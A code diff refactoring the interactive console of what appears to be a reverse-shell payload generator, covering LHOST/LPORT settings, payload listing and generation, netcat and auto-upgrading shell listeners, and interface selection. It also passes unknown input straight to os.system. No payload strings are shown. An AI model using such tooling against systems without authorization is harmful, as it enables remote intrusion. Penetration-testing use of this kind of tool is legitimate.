-                        change_config(host=display)
-                    else:
-                        change_config(port=display)
+                    change_config(host=display) if label=="LHOST" else change_config(port=display)
                 else:
-                    if args_lst[0].lower() in ("ip","host","lhost") and is_interface_name(args_lst[1]):
-                        print(f"  {C.r(f'Interface {repr(args_lst[1])} not found.')}")
-                        print(f"  {C.grey('Run')} ifconfig {C.grey('to list available interfaces.')}")
+                    if args[0].lower() in ("ip","host","lhost") and is_interface_name(args[1]):
+                        print(C.r(f"  Interface '{args[1]}' not found."))
+                        print(C.grey("  Run ifconfig to list available interfaces."))
                     else:
-                        print(f"  {C.r(f'Unknown key: {repr(args_lst[0])} (ip, port)')}")
+                        print(C.r(f"  Unknown key: '{args[0]}'  (ip, port)"))
 
-        # ── unset ─────────────────────────────────────────────────────────
         elif cmd == "unset":
-            if not args_lst:
-                print(f"  {C.r('Usage: unset <ip|port>')}")
+            if not args:
+                print(C.r("  Usage: unset <ip|port>"))
             else:
-                k = args_lst[0].lower()
+                k = args[0].lower()
                 if k in ("ip","host","lhost"):
                     session.lhost = None
                     change_config(host="")
-                    print(f"  {C.grey('LHOST cleared.')}")
+                    print(C.grey("  LHOST cleared."))
                 elif k in ("port","lport"):
                     session.lport = None
                     change_config(port="")
-                    print(f"  {C.grey('LPORT cleared.')}")
+                    print(C.grey("  LPORT cleared."))
                 else:
-                    print(f"  {C.r(f'Unknown key: {repr(args_lst[0])}')}")
+                    print(C.r(f"  Unknown key: '{args[0]}'"))
 
-        # ── show ──────────────────────────────────────────────────────────
         elif cmd == "show":
-            sub = args_lst[0].lower() if args_lst else ""
+            sub = args[0].lower() if args else ""
             if sub == "options":
                 h = C.g(session.lhost) if session.lhost else C.r("not set")
                 p = C.g(session.lport) if session.lport else C.r("not set")
@@ -1056,14 +1137,13 @@ def run_console(session: Optional[Session] = None, no_banner: bool = False) -> N
                 print(f"  LPORT  {C.grey('=>')}  {p}\n")
             elif sub in CATEGORIES:
                 print_payload_list(cat_filter=sub)
-            elif sub in ("payloads", "shells", ""):
+            elif sub in ("payloads","shells",""):
                 print_payload_list()
             else:
-                print(f"  {C.r(f'Unknown option: {repr(sub)}')}")
+                print(C.r(f"  Unknown option: '{sub}'"))
 
-        # ── ifconfig / interfaces ─────────────────────────────────────────
-        elif cmd in ("ifconfig", "interfaces"):
-            sub    = args_lst[0].lower() if args_lst else ""
+        elif cmd in ("ifconfig","interfaces"):
+            sub    = args[0].lower() if args else ""
             ifaces = get_interfaces()
             if sub == "pick":
                 interactive_iface_picker(session)
@@ -1071,95 +1151,85 @@ def run_console(session: Optional[Session] = None, no_banner: bool = False) -> N
                 print_interfaces(highlight=sub)
             else:
                 print_interfaces()
-                print(f"  {C.grey('Tip:')} ifconfig pick {C.grey('to set LHOST interactively')}\n")
+                print(C.grey("  Tip: ifconfig pick  to set LHOST interactively\n"))
 
-        # ── use ───────────────────────────────────────────────────────────
         elif cmd == "use":
-            if not args_lst:
-                print(f"  {C.r('Usage: use <key>  — run show to list keys')}")
+            if not args:
+                print(C.r("  Usage: use <key>  — run show to list keys"))
             else:
-                key = args_lst[0].lower()
+                key = args[0].lower()
                 if key in PAYLOAD_MAP:
                     print_single_payload(PAYLOAD_MAP[key], session)
                 else:
-                    print(f"  {C.r(f'Unknown payload: {repr(args_lst[0])}')}")
+                    print(C.r(f"  Unknown payload: '{args[0]}'"))
 
-        # ── run / generate ────────────────────────────────────────────────
-        elif cmd in ("run", "generate"):
-            platform_filter: Optional[str] = None
-            cat_filter: Optional[str]      = None
-            remaining: list[str]           = []
+        elif cmd in ("run","generate"):
+            pf:  Optional[str] = None
+            cf:  Optional[str] = None
+            rem: list[str]     = []
             i = 0
-            while i < len(args_lst):
-                a = args_lst[i]
-                if a in ("--unix", "-u"):
-                    platform_filter = "unix"
-                elif a in ("--windows", "-w"):
-                    platform_filter = "windows"
-                elif a in ("--cat", "-c") and i + 1 < len(args_lst):
-                    cat_filter = args_lst[i + 1].lower()
-                    i += 1
+            while i < len(args):
+                a = args[i]
+                if a in ("--unix","-u"):       pf = "unix"
+                elif a in ("--windows","-w"):  pf = "windows"
+                elif a in ("--cat","-c") and i+1 < len(args):
+                    cf = args[i+1].lower(); i += 1
                 else:
-                    remaining.append(a)
+                    rem.append(a)
                 i += 1
-            if remaining:
-                key = remaining[0].lower()
+            if rem:
+                key = rem[0].lower()
                 if key in PAYLOAD_MAP:
                     print_single_payload(PAYLOAD_MAP[key], session)
                 else:
-                    print(f"  {C.r(f'Unknown payload: {repr(remaining[0])}')}")
+                    print(C.r(f"  Unknown payload: '{rem[0]}'"))
             else:
-                print_all_payloads(session, platform_filter, cat_filter)
+                print_all_payloads(session, pf, cf)
 
-        # ── listener ──────────────────────────────────────────────────────
         elif cmd == "listener":
             if not session.lport:
-                print(f"  {C.r('LPORT not set — set port <port>')}")
+                print(C.r("  LPORT not set — type: set port <port>"))
             else:
-                start_listener(session.lport, use_rlwrap=False)
+                no_upgrade = "--no-upgrade" in args
+                smart_listener(
+                    session.lport,
+                    lhost=session.lhost or "0.0.0.0",
+                    auto_upgrade_flag=not no_upgrade,
+                )
 
-        # ── rlwrap ────────────────────────────────────────────────────────
         elif cmd == "rlwrap":
             if not session.lport:
-                print(f"  {C.r('LPORT not set — set port <port>')}")
+                print(C.r("  LPORT not set — type: set port <port>"))
             else:
-                start_listener(session.lport, use_rlwrap=True)
+                nc_listener(session.lport, use_rlwrap=True)
 
-        # ── unknown ───────────────────────────────────────────────────────
         else:
             os.system(cmd)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Entry point
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Entry point ──────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
-    parser = build_arg_parser()
+    parser   = build_arg_parser()
     cli_args = parser.parse_args()
 
-    # Detect whether any non-interactive flag was passed
     non_interactive = any([
-        cli_args.all,
-        cli_args.use,
-        cli_args.list,
-        cli_args.listen,
-        cli_args.rlwrap,
-        cli_args.ifconfig,
+        cli_args.all, cli_args.use, cli_args.list,
+        cli_args.listen, cli_args.rlwrap, cli_args.ifconfig,
     ])
 
     if non_interactive:
         rc = run_cli(cli_args)
         sys.exit(0 if rc >= 0 else 1)
     else:
-        # Interactive console — optionally pre-seed session from CLI args
         session = Session()
         if cli_args.host:
             if is_interface_name(cli_args.host):
                 ip = resolve_iface_ip(cli_args.host)
                 if ip:
                     session.lhost = ip
-                    print(f"  LHOST  {C.grey('=>')}  {C.g(ip)}  {C.grey('(from ' + cli_args.host + ')')}")
+                    print(f"  LHOST  {C.grey('=>')}  {C.g(ip)}  "
+                          f"{C.grey('(from ' + cli_args.host + ')')}")
                 else:
                     print(C.r(f"  Interface '{cli_args.host}' not found."), file=sys.stderr)
                     sys.exit(1)
@@ -1167,5 +1237,4 @@ if __name__ == "__main__":
                 session.lhost = cli_args.host
         if cli_args.port:
             session.lport = cli_args.port
-
         run_console(session=session, no_banner=cli_args.no_banner)
